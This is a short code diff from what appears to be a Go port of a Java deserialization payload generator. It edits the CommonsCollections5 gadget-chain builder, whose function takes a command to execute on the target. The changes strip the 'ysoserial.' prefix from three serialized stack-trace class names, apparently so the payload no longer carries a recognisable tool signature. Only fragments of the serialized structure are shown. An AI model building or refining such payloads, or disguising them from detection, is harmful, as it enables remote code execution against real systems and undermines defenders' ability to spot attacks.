@@ -245,7 +245,7 @@ func CommonsCollections5(cmd string) []byte {
 								classDescFlags:   SC_SERIALIZABLE,
 								fields: []Field{
 									{Integer, "lineNumber", 81},
-									{"Ljava/lang/String;", "declaringClass", "ysoserial.payloads.CommonsCollections5"},
+									{"Ljava/lang/String;", "declaringClass", "payloads.CommonsCollections5"},
 									{"Ljava/lang/String;", "fileName", "CommonsCollections5.java"},
 									{"Ljava/lang/String;", "methodName", "getObject"},
 								},
@@ -257,7 +257,7 @@ func CommonsCollections5(cmd string) []byte {
 								classDescFlags:   SC_SERIALIZABLE,
 								fields: []Field{
 									{Integer, "lineNumber", 51},
-									{"Ljava/lang/String;", "declaringClass", "ysoserial.payloads.CommonsCollections5"},
+									{"Ljava/lang/String;", "declaringClass", "payloads.CommonsCollections5"},
 									{"Ljava/lang/String;", "fileName", "CommonsCollections5.java"},
 									{"Ljava/lang/String;", "methodName", "getObject"},
 								},
@@ -269,7 +269,7 @@ func CommonsCollections5(cmd string) []byte {
 								classDescFlags:   SC_SERIALIZABLE,
 								fields: []Field{
 									{Integer, "lineNumber", 34},
-									{"Ljava/lang/String;", "declaringClass", "ysoserial.GeneratePayload"},
+									{"Ljava/lang/String;", "declaringClass", "GeneratePayload"},
 									{"Ljava/lang/String;", "fileName", "GeneratePayload.java"},
 									{"Ljava/lang/String;", "methodName", "main"},
 								},
